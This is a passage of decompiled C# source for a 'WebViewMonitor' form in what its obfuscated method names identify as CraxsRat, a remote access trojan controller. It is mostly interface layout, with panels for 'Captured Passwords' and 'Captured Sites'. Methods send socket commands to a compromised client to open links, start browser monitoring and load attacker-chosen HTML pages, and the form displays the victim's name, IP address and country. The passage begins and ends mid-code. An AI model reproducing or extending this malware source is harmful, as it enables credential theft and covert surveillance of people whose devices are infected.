		this.TabPage2.Controls.Add(this.Panel4);
		this.TabPage2.Location = new System.Drawing.Point(0, 80);
		this.TabPage2.Name = "TabPage2";
		this.TabPage2.Size = new System.Drawing.Size(928, 453);
		this.TabPage2.TabIndex = 1;
		this.TabPage2.Text = "Custome";
		this.resulttext.BackColor = System.Drawing.Color.Black;
		this.resulttext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.resulttext.ForeColor = System.Drawing.Color.SkyBlue;
		this.resulttext.Location = new System.Drawing.Point(0, 55);
		this.resulttext.Name = "resulttext";
		this.resulttext.Size = new System.Drawing.Size(928, 398);
		this.resulttext.TabIndex = 1;
		this.resulttext.Text = "Client Result";
		this.resulttext.TextAlign = System.Drawing.ContentAlignment.TopCenter;
		this.Panel4.BackColor = System.Drawing.Color.Black;
		this.Panel4.Controls.Add(this.Label2);
		this.Panel4.Controls.Add(this.selecthtmlbtn);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel4.Location = new System.Drawing.Point(0, 0);
		this.Panel4.Name = "Panel4";
		this.Panel4.Size = new System.Drawing.Size(928, 55);
		this.Panel4.TabIndex = 2;
		this.Label2.AutoSize = true;
		this.Label2.Font = new System.Drawing.Font("Calibri", 20f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label2.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label2.Location = new System.Drawing.Point(12, 8);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(183, 33);
		this.Label2.TabIndex = 20;
		this.Label2.Text = "Add Html View";
		this.selecthtmlbtn.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.selecthtmlbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.selecthtmlbtn.FillColor = System.Drawing.Color.Black;
		this.selecthtmlbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.selecthtmlbtn.FillPressColor = System.Drawing.Color.Black;
		this.selecthtmlbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.selecthtmlbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.selecthtmlbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.selecthtmlbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.selecthtmlbtn.Location = new System.Drawing.Point(748, 19);
		this.selecthtmlbtn.Name = "selecthtmlbtn";
		this.selecthtmlbtn.Radius = 25;
		this.selecthtmlbtn.RectColor = System.Drawing.Color.SkyBlue;
		this.selecthtmlbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.selecthtmlbtn.RectHoverColor = System.Drawing.Color.White;
		this.selecthtmlbtn.RectPressColor = System.Drawing.Color.White;
		this.selecthtmlbtn.RectSelectedColor = System.Drawing.Color.White;
		this.selecthtmlbtn.Size = new System.Drawing.Size(170, 24);
		this.selecthtmlbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.selecthtmlbtn.Symbol = 61543;
		this.selecthtmlbtn.TabIndex = 18;
		this.selecthtmlbtn.Text = "Select Html File";
		this.TabPage3.BackColor = System.Drawing.Color.Black;
		this.TabPage3.Controls.Add(this.datapanel);
		this.TabPage3.Controls.Add(this.linkspanel);
		this.TabPage3.Controls.Add(this.Panel8);
		this.TabPage3.Controls.Add(this.Panel9);
		this.TabPage3.Location = new System.Drawing.Point(0, 80);
		this.TabPage3.Margin = new System.Windows.Forms.Padding(2);
		this.TabPage3.Name = "TabPage3";
		this.TabPage3.Size = new System.Drawing.Size(928, 453);
		this.TabPage3.TabIndex = 0;
		this.TabPage3.Text = "Passwords";
		this.datapanel.Controls.Add(this.datalogtext);
		this.datapanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.datapanel.FillColor = System.Drawing.Color.Black;
		this.datapanel.Font = new System.Drawing.Font("Calibri", 12f);
		this.datapanel.ForeColor = System.Drawing.Color.White;
		this.datapanel.Location = new System.Drawing.Point(284, 38);
		this.datapanel.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.datapanel.Name = "datapanel";
		this.datapanel.Padding = new System.Windows.Forms.Padding(0, 26, 0, 0);
		this.datapanel.RectColor = System.Drawing.Color.SkyBlue;
		this.datapanel.Size = new System.Drawing.Size(644, 375);
		this.datapanel.Style = DrakeUI.Framework.UIStyle.Custom;
		this.datapanel.TabIndex = 1;
		this.datapanel.Text = "Captured Passwords";
		this.datapanel.TitleColor = System.Drawing.Color.SkyBlue;
		this.datalogtext.AutoWordSelection = true;
		this.datalogtext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.datalogtext.FillColor = System.Drawing.Color.Black;
		this.datalogtext.Font = new System.Drawing.Font("Calibri", 12f);
		this.datalogtext.ForeColor = System.Drawing.Color.SkyBlue;
		this.datalogtext.Location = new System.Drawing.Point(0, 26);
		this.datalogtext.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.datalogtext.Name = "datalogtext";
		this.datalogtext.Padding = new System.Windows.Forms.Padding(2);
		this.datalogtext.RectColor = System.Drawing.Color.FromArgb(130, 130, 130);
		this.datalogtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.datalogtext.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom | System.Windows.Forms.ToolStripStatusLabelBorderSides.Left | System.Windows.Forms.ToolStripStatusLabelBorderSides.Right;
		this.datalogtext.Size = new System.Drawing.Size(644, 349);
		this.datalogtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.datalogtext.StyleCustomMode = true;
		this.datalogtext.TabIndex = 0;
		this.linkspanel.Dock = System.Windows.Forms.DockStyle.Left;
		this.linkspanel.FillColor = System.Drawing.Color.Black;
		this.linkspanel.Font = new System.Drawing.Font("Calibri", 12f);
		this.linkspanel.ForeColor = System.Drawing.Color.SkyBlue;
		this.linkspanel.Location = new System.Drawing.Point(0, 38);
		this.linkspanel.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.linkspanel.Name = "linkspanel";
		this.linkspanel.Padding = new System.Windows.Forms.Padding(0, 26, 0, 0);
		this.linkspanel.RectColor = System.Drawing.Color.SkyBlue;
		this.linkspanel.Size = new System.Drawing.Size(284, 375);
		this.linkspanel.Style = DrakeUI.Framework.UIStyle.Custom;
		this.linkspanel.TabIndex = 2;
		this.linkspanel.Text = "Captured Sites";
		this.linkspanel.TitleColor = System.Drawing.Color.SkyBlue;
		this.Panel8.BackColor = System.Drawing.Color.Black;
		this.Panel8.Controls.Add(this.Label3);
		this.Panel8.Controls.Add(this.comandcombo);
		this.Panel8.Controls.Add(this.namescombo);
		this.Panel8.Controls.Add(this.commndbtn);
		this.Panel8.Controls.Add(this.idtext);
		this.Panel8.Controls.Add(this.nametext);
		this.Panel8.Controls.Add(this.linktext);
		this.Panel8.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel8.Location = new System.Drawing.Point(0, 0);
		this.Panel8.Margin = new System.Windows.Forms.Padding(2);
		this.Panel8.Name = "Panel8";
		this.Panel8.Size = new System.Drawing.Size(928, 38);
		this.Panel8.TabIndex = 0;
		this.Label3.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label3.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label3.Location = new System.Drawing.Point(594, 8);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(90, 23);
		this.Label3.TabIndex = 49;
		this.Label3.Text = "Command";
		this.Label3.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.comandcombo.BackColor = System.Drawing.Color.Black;
		this.comandcombo.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.comandcombo.FillColor = System.Drawing.Color.Black;
		this.comandcombo.Font = new System.Drawing.Font("Calibri", 12f);
		this.comandcombo.ForeColor = System.Drawing.Color.SkyBlue;
		this.comandcombo.Items.AddRange(new object[4] { "Add", "Remove", "Edit", "Clean" });
		this.comandcombo.Location = new System.Drawing.Point(690, 7);
		this.comandcombo.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.comandcombo.MinimumSize = new System.Drawing.Size(47, 0);
		this.comandcombo.Name = "comandcombo";
		this.comandcombo.Padding = new System.Windows.Forms.Padding(0, 0, 22, 0);
		this.comandcombo.Radius = 15;
		this.comandcombo.RectColor = System.Drawing.Color.SkyBlue;
		this.comandcombo.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.comandcombo.Size = new System.Drawing.Size(82, 27);
		this.comandcombo.Style = DrakeUI.Framework.UIStyle.Custom;
		this.comandcombo.TabIndex = 48;
		this.comandcombo.Text = "Add";
		this.comandcombo.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.namescombo.BackColor = System.Drawing.Color.Black;
		this.namescombo.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.namescombo.FillColor = System.Drawing.Color.Black;
		this.namescombo.Font = new System.Drawing.Font("Calibri", 12f);
		this.namescombo.ForeColor = System.Drawing.Color.SkyBlue;
		this.namescombo.Location = new System.Drawing.Point(10, 7);
		this.namescombo.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.namescombo.MinimumSize = new System.Drawing.Size(47, 0);
		this.namescombo.Name = "namescombo";
		this.namescombo.Padding = new System.Windows.Forms.Padding(0, 0, 22, 0);
		this.namescombo.Radius = 15;
		this.namescombo.RectColor = System.Drawing.Color.SkyBlue;
		this.namescombo.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.namescombo.Size = new System.Drawing.Size(112, 27);
		this.namescombo.Style = DrakeUI.Framework.UIStyle.Custom;
		this.namescombo.TabIndex = 47;
		this.namescombo.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.commndbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.commndbtn.FillColor = System.Drawing.Color.Black;
		this.commndbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.commndbtn.FillPressColor = System.Drawing.Color.Black;
		this.commndbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.commndbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.commndbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.commndbtn.Location = new System.Drawing.Point(778, 8);
		this.commndbtn.Name = "commndbtn";
		this.commndbtn.Radius = 25;
		this.commndbtn.RectColor = System.Drawing.Color.SkyBlue;
		this.commndbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.commndbtn.RectHoverColor = System.Drawing.Color.White;
		this.commndbtn.RectPressColor = System.Drawing.Color.White;
		this.commndbtn.RectSelectedColor = System.Drawing.Color.White;
		this.commndbtn.Size = new System.Drawing.Size(146, 24);
		this.commndbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.commndbtn.Symbol = 61913;
		this.commndbtn.TabIndex = 20;
		this.commndbtn.Text = "Send Command";
		this.idtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.idtext.FillColor = System.Drawing.Color.Black;
		this.idtext.Font = new System.Drawing.Font("Calibri", 12f);
		this.idtext.ForeColor = System.Drawing.Color.White;
		this.idtext.Location = new System.Drawing.Point(386, 7);
		this.idtext.Margin = new System.Windows.Forms.Padding(4);
		this.idtext.Maximum = 2147483647.0;
		this.idtext.Minimum = -2147483648.0;
		this.idtext.Name = "idtext";
		this.idtext.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.idtext.Radius = 10;
		this.idtext.RectColor = System.Drawing.Color.SkyBlue;
		this.idtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.idtext.Size = new System.Drawing.Size(121, 27);
		this.idtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.idtext.StyleCustomMode = true;
		this.idtext.TabIndex = 46;
		this.idtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.idtext.Watermark = "App-ID";
		this.nametext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.nametext.FillColor = System.Drawing.Color.Black;
		this.nametext.Font = new System.Drawing.Font("Calibri", 12f);
		this.nametext.ForeColor = System.Drawing.Color.SkyBlue;
		this.nametext.Location = new System.Drawing.Point(130, 7);
		this.nametext.Margin = new System.Windows.Forms.Padding(4);
		this.nametext.Maximum = 2147483647.0;
		this.nametext.Minimum = -2147483648.0;
		this.nametext.Name = "nametext";
		this.nametext.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.nametext.Radius = 10;
		this.nametext.RectColor = System.Drawing.Color.SkyBlue;
		this.nametext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.nametext.Size = new System.Drawing.Size(121, 27);
		this.nametext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.nametext.StyleCustomMode = true;
		this.nametext.TabIndex = 45;
		this.nametext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.nametext.Watermark = "App-Name";
		this.linktext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.linktext.FillColor = System.Drawing.Color.Black;
		this.linktext.Font = new System.Drawing.Font("Calibri", 12f);
		this.linktext.ForeColor = System.Drawing.Color.White;
		this.linktext.Location = new System.Drawing.Point(258, 7);
		this.linktext.Margin = new System.Windows.Forms.Padding(4);
		this.linktext.Maximum = 2147483647.0;
		this.linktext.Minimum = -2147483648.0;
		this.linktext.Name = "linktext";
		this.linktext.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.linktext.Radius = 10;
		this.linktext.RectColor = System.Drawing.Color.SkyBlue;
		this.linktext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.linktext.Size = new System.Drawing.Size(121, 27);
		this.linktext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.linktext.StyleCustomMode = true;
		this.linktext.TabIndex = 44;
		this.linktext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.linktext.Watermark = "Link";
		this.Panel9.Controls.Add(this.refbtn);
		this.Panel9.Controls.Add(this.savbtn);
		this.Panel9.Controls.Add(this.clrbtn);
		this.Panel9.Controls.Add(this.cpybtn);
		this.Panel9.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel9.Location = new System.Drawing.Point(0, 413);
		this.Panel9.Margin = new System.Windows.Forms.Padding(2);
		this.Panel9.Name = "Panel9";
		this.Panel9.Size = new System.Drawing.Size(928, 40);
		this.Panel9.TabIndex = 21;
		this.refbtn.BackColor = System.Drawing.Color.Black;
		this.refbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.refbtn.FillColor = System.Drawing.Color.Black;
		this.refbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.refbtn.Location = new System.Drawing.Point(10, 7);
		this.refbtn.Name = "refbtn";
		this.refbtn.Radius = 25;
		this.refbtn.RectColor = System.Drawing.Color.SkyBlue;
		this.refbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.refbtn.Size = new System.Drawing.Size(100, 24);
		this.refbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.refbtn.StyleCustomMode = true;
		this.refbtn.Symbol = 61473;
		this.refbtn.TabIndex = 20;
		this.refbtn.Text = "Refresh";
		this.savbtn.BackColor = System.Drawing.Color.Black;
		this.savbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.savbtn.FillColor = System.Drawing.Color.Black;
		this.savbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.savbtn.FillPressColor = System.Drawing.Color.Black;
		this.savbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.savbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.savbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.savbtn.Location = new System.Drawing.Point(712, 7);
		this.savbtn.Name = "savbtn";
		this.savbtn.Radius = 25;
		this.savbtn.RectColor = System.Drawing.Color.SkyBlue;
		this.savbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.savbtn.RectHoverColor = System.Drawing.Color.White;
		this.savbtn.RectPressColor = System.Drawing.Color.White;
		this.savbtn.RectSelectedColor = System.Drawing.Color.White;
		this.savbtn.Size = new System.Drawing.Size(100, 24);
		this.savbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.savbtn.Symbol = 61717;
		this.savbtn.TabIndex = 24;
		this.savbtn.Text = "Saved";
		this.clrbtn.BackColor = System.Drawing.Color.Black;
		this.clrbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.clrbtn.FillColor = System.Drawing.Color.Black;
		this.clrbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.clrbtn.FillPressColor = System.Drawing.Color.Black;
		this.clrbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.clrbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.clrbtn.ForePressColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.clrbtn.Location = new System.Drawing.Point(818, 7);
		this.clrbtn.Name = "clrbtn";
		this.clrbtn.Radius = 25;
		this.clrbtn.RectColor = System.Drawing.Color.SkyBlue;
		this.clrbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.clrbtn.RectHoverColor = System.Drawing.Color.White;
		this.clrbtn.RectPressColor = System.Drawing.Color.White;
		this.clrbtn.RectSelectedColor = System.Drawing.Color.White;
		this.clrbtn.Size = new System.Drawing.Size(100, 24);
		this.clrbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.clrbtn.Symbol = 61741;
		this.clrbtn.TabIndex = 23;
		this.clrbtn.Text = "Clear";
		this.cpybtn.BackColor = System.Drawing.Color.Black;
		this.cpybtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.cpybtn.FillColor = System.Drawing.Color.Black;
		this.cpybtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.cpybtn.FillPressColor = System.Drawing.Color.Black;
		this.cpybtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.cpybtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.cpybtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.cpybtn.Location = new System.Drawing.Point(605, 7);
		this.cpybtn.Name = "cpybtn";
		this.cpybtn.Radius = 25;
		this.cpybtn.RectColor = System.Drawing.Color.SkyBlue;
		this.cpybtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.cpybtn.RectHoverColor = System.Drawing.Color.White;
		this.cpybtn.RectPressColor = System.Drawing.Color.White;
		this.cpybtn.RectSelectedColor = System.Drawing.Color.White;
		this.cpybtn.Size = new System.Drawing.Size(100, 24);
		this.cpybtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.cpybtn.Symbol = 62029;
		this.cpybtn.TabIndex = 22;
		this.cpybtn.Text = "Copy";
		this.timeloader.Interval = 30;
		this.Panel5.BackColor = System.Drawing.Color.Black;
		this.Panel5.Controls.Add(this.clinameinfo);
		this.Panel5.Controls.Add(this.ClientPic);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel5.ForeColor = System.Drawing.Color.Red;
		this.Panel5.Location = new System.Drawing.Point(0, 0);
		this.Panel5.Margin = new System.Windows.Forms.Padding(2);
		this.Panel5.Name = "Panel5";
		this.Panel5.Size = new System.Drawing.Size(928, 29);
		this.Panel5.TabIndex = 6;
		this.clinameinfo.BackColor = System.Drawing.Color.Transparent;
		this.clinameinfo.Dock = System.Windows.Forms.DockStyle.Fill;
		this.clinameinfo.Font = new System.Drawing.Font("Calibri", 9f);
		this.clinameinfo.ForeColor = System.Drawing.Color.SkyBlue;
		this.clinameinfo.Location = new System.Drawing.Point(32, 0);
		this.clinameinfo.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.clinameinfo.Name = "clinameinfo";
		this.clinameinfo.Size = new System.Drawing.Size(896, 29);
		this.clinameinfo.TabIndex = 12;
		this.clinameinfo.Text = "...";
		this.clinameinfo.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.ClientPic.Dock = System.Windows.Forms.DockStyle.Left;
		this.ClientPic.Location = new System.Drawing.Point(0, 0);
		this.ClientPic.Margin = new System.Windows.Forms.Padding(2, 3, 2, 3);
		this.ClientPic.Name = "ClientPic";
		this.ClientPic.Size = new System.Drawing.Size(32, 29);
		this.ClientPic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.ClientPic.TabIndex = 11;
		this.ClientPic.TabStop = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 12f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(928, 578);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.Panel5);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Name = "WebViewMonitor";
		base.ShowIcon = false;
		this.Text = "WebViewMonitor";
		this.Panel1.ResumeLayout(false);
		this.Panel7.ResumeLayout(false);
		this.Panel6.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		this.tabcontrols.ResumeLayout(false);
		this.TabPage1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.vewimage).EndInit();
		this.TabPage2.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		this.Panel4.PerformLayout();
		this.TabPage3.ResumeLayout(false);
		this.datapanel.ResumeLayout(false);
		this.Panel8.ResumeLayout(false);
		this.Panel9.ResumeLayout(false);
		this.Panel5.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.ClientPic).EndInit();
		base.ResumeLayout(false);
	}

	private void DrakeUITextBox1_MouseDown(object sender, MouseEventArgs e)
	{
		if (Conversions.ToBoolean(firstclick))
		{
			firstclick = false;
			TargetLink.Text = "";
		}
	}

	public WebViewMonitor()
	{
		base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatsokqautry;
		base.FormClosing += WebViewMonitor_FormClosing;
		Title = "null";
		firstclick = true;
		MapData = new Dictionary<string, string>();
		y = 0;
		InitializeComponent();
	}

	public void PostData(string datastring)
	{
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			datalogtext.AppendText("> " + datastring + "\r\n");
		}));
	}

	public void addlinks(string lnk)
	{
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			Label label = new Label();
			label.Cursor = Cursors.Hand;
			label.Dock = DockStyle.Top;
			label.Font = new Font("Calibri", 14f);
			label.ForeColor = Color.Aqua;
			label.Size = new Size(631, 40);
			label.TabIndex = 0;
			label.Text = lnk;
			label.TextAlign = ContentAlignment.MiddleCenter;
			label.MouseClick += [SpecialName] (object sender, MouseEventArgs e) =>
			{
				try
				{
					if (Classclient != null)
					{
						try
						{
							string[] array = Classclient.Keys.Split(':');
							object[] parametersObjects = new object[4]
							{
								Classclient.myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lodp<*>g<*>" + label.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								Classclient
							};
							Classclient.SendMessage(parametersObjects);
							return;
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							return;
						}
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			};
			linkspanel.Controls.Add(label);
		}));
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsnhsdzx(object sender, EventArgs e)
	{
		if (Classclient == null)
		{
			return;
		}
		if (!string.IsNullOrEmpty(TargetLink.Text) && !string.IsNullOrEmpty(TargetLink.Text))
		{
			string[] array = Classclient.Keys.Split(':');
			int num = 0;
			int num2 = 0;
			string text = "";
			if (Operators.CompareString(DrakeUIComboBox1.Text.ToLower(), "just open".ToLower(), TextCompare: false) == 0)
			{
				statustext.Text = "Request Sent";
			}
			else
			{
				text = "mon<*>";
				statustext.Text = "Starting Monitoring , Please Wait...";
			}
			object[] parametersObjects = new object[4]
			{
				Classclient.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lnk<*>" + text + reso.ChekLink(TargetLink.Text) + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
		else
		{
			CraxsAlert.ShowWarning("Enter Link First !!!");
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsokqautry(object sender, EventArgs e)
	{
		DrakeUIComboBox1.Text = "just open";
		try
		{
			ClientPic.Image = Classclient.Wallpaper;
			clinameinfo.Text = "Name: " + Classclient.ClientName + Strings.Space(2) + "IP: " + Classclient.ClientAddressIP + Strings.Space(2) + "Country: " + Classclient.Country;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		translateme();
		try
		{
			if (!Directory.Exists(Classclient.FolderUSER + "\\Browser_CAP"))
			{
				Directory.CreateDirectory(Classclient.FolderUSER + "\\Browser_CAP");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		BWloader.RunWorkerAsync();
	}

	private void translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				Mytitle.Text = Codes.Translate(Mytitle.Text, "en", "ar");
				openbtn.Text = Codes.Translate(openbtn.Text, "en", "ar");
				Label2.Text = Codes.Translate(Label2.Text, "en", "ar");
				Label3.Text = Codes.Translate(Label3.Text, "en", "ar");
				clrbtn.Text = Codes.Translate(clrbtn.Text, "en", "ar");
				savbtn.Text = Codes.Translate(savbtn.Text, "en", "ar");
				cpybtn.Text = Codes.Translate(cpybtn.Text, "en", "ar");
				refbtn.Text = Codes.Translate(refbtn.Text, "en", "ar");
				commndbtn.Text = Codes.Translate(commndbtn.Text, "en", "ar");
				linkspanel.Text = Codes.Translate(selecthtmlbtn.Text, "en", "ar");
				datapanel.Text = Codes.Translate(datapanel.Text, "en", "ar");
				selecthtmlbtn.Text = Codes.Translate(selecthtmlbtn.Text, "en", "ar");
				tabcontrols.TabPages[0].Text = Codes.Translate(tabcontrols.TabPages[0].Text, "en", "ar");
				tabcontrols.TabPages[1].Text = Codes.Translate(tabcontrols.TabPages[1].Text, "en", "ar");
				tabcontrols.TabPages[2].Text = Codes.Translate(tabcontrols.TabPages[2].Text, "en", "ar");
			}
		}
		else
		{
			Mytitle.Text = Codes.Translate(Mytitle.Text, "en", "zh");
			openbtn.Text = Codes.Translate(openbtn.Text, "en", "zh");
			Label2.Text = Codes.Translate(Label2.Text, "en", "zh");
			Label3.Text = Codes.Translate(Label3.Text, "en", "zh");
			clrbtn.Text = Codes.Translate(clrbtn.Text, "en", "zh");
			savbtn.Text = Codes.Translate(savbtn.Text, "en", "zh");
			cpybtn.Text = Codes.Translate(cpybtn.Text, "en", "zh");
			refbtn.Text = Codes.Translate(refbtn.Text, "en", "zh");
			commndbtn.Text = Codes.Translate(commndbtn.Text, "en", "zh");
			selecthtmlbtn.Text = Codes.Translate(selecthtmlbtn.Text, "en", "zh");
			linkspanel.Text = Codes.Translate(linkspanel.Text, "en", "zh");
			datapanel.Text = Codes.Translate(datapanel.Text, "en", "zh");
			tabcontrols.TabPages[0].Text = Codes.Translate(tabcontrols.TabPages[0].Text, "en", "zh");
			tabcontrols.TabPages[1].Text = Codes.Translate(tabcontrols.TabPages[1].Text, "en", "zh");
			tabcontrols.TabPages[2].Text = Codes.Translate(tabcontrols.TabPages[2].Text, "en", "zh");
		}
	}

	private void Vsbar_ValueChanged(object sender, EventArgs e)
	{
		try
		{
			if (vewimage.Image != null)
			{
				y = (sender as DrakeUIScrollBar).Value;
				vewimage.Refresh();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Vewimage_Paint(object sender, PaintEventArgs e)
	{
	}

	private void BWloader_DoWork(object sender, DoWorkEventArgs e)
	{
		try
		{
			if (Classclient != null)
			{
				string[] array = Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lodp<*>l<*>" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwashgys(object sender, EventArgs e)
	{
		try
		{
